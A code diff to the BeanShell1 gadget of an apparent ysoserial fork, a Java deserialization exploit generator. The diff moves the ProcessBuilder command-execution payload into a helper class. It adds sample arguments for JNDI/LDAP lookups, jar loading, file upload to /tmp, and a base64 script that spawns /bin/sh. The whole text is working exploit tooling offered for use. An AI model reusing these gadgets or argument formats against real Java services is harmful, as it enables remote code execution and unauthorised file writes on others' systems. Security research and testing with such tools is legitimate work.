@@ -11,6 +11,7 @@ import java.util.PriorityQueue;
 
 import ysoserial.Strings;
 import ysoserial.payloads.annotation.Authors;
+import ysoserial.payloads.custom.BeanShellUtil;
 import ysoserial.payloads.util.Reflections;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.PayloadRunner;
@@ -26,13 +27,7 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
 
     public PriorityQueue getObject(String command) throws Exception {
 	// BeanShell payload
-
-        String payload =
-            "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
-                Strings.join( // does not support spaces in quotes
-                    Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
-                    ",", "\"", "\"") +
-                "}).start();return new Integer(1);}";
+    String payload = BeanShellUtil.getPayload(command);
 
 	// Create Interpreter
 	Interpreter i = new Interpreter();
@@ -56,7 +51,15 @@ public class BeanShell1 extends PayloadRunner implements ObjectPayload<PriorityQ
 	return priorityQueue;
     }
 
-    public static void main(final String[] args) throws Exception {
-	PayloadRunner.run(BeanShell1.class, args);
+    public static void main(String[] args) throws Exception {
+        //args = new String[]{"sleep:10"};
+        //args = new String[]{"jndi:ldap://127.0.0.1:1664/obj"};
+        //args = new String[]{"loadjar:file:///Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.jar|Calc"};
+        //args = new String[]{"loadjar_with_args:file:///Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.jar|Calc|open /System/Applications/Calculator.app/Contents/MacOS/Calculator"};
+        //args = new String[]{"upload_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/testfile/JavaScriptTest.js|/tmp/JavaScriptTest2.js"};
+        //args = new String[]{"script_file:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/testfile/JavaScriptTest.js"};
+        //args = new String[]{"script_base64:bmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlclsnKGphdmEubGFuZy5TdHJpbmdbXSknXShbJy9iaW4vc2gnLCctYycsJ29wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvciddKS5zdGFydCgp"};
+        args = new String[]{"upload_file_base64:/tmp/a.txt|YzBueTE="};
+        PayloadRunner.run(BeanShell1.class, args);
     }
 }
